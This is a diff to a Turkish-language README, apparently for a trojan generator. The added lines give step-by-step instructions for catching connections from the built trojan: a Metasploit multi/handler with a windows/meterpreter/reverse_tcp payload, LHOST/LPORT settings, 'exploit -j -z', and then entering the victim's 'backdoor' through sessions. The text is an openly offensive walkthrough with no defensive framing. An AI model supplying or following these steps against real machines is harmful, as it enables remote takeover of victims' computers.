@@ -6,5 +6,16 @@
 #### 4.```LHOST, LPORT``` giriyoruz
 #### 5. Trojan adını seçiyoruz
 #### 6. ```32bit/64bit``` seçiyoruz
-#### 7. Trojan'ı oluşturuyoruz
+#### 7. Trojan'ı oluşturuyoruz ve dinliyoruz
+
+# Dinlemek için
+
+#### 1.```msfconsole``` 
+#### 2.```use exploit/multi/handler``` diyerek payload tanımlıyoruz
+#### 3.```set patload windows/meterpreter/reverse_tcp```  (trojanın oluşturulma tipine göre değişiklik gösterebilir) 
+#### 4.```LHOST ve LPORT```'u değiştiriyoruz
+#### 5.```exploit -j -z``` ile dinlemeye başlıyoruz 
+#### 6. Trojan çalıştığında ```sessions -l``` ve ```session 1``` ile backdoor'dan giriş yapıyoruz
+
+
 
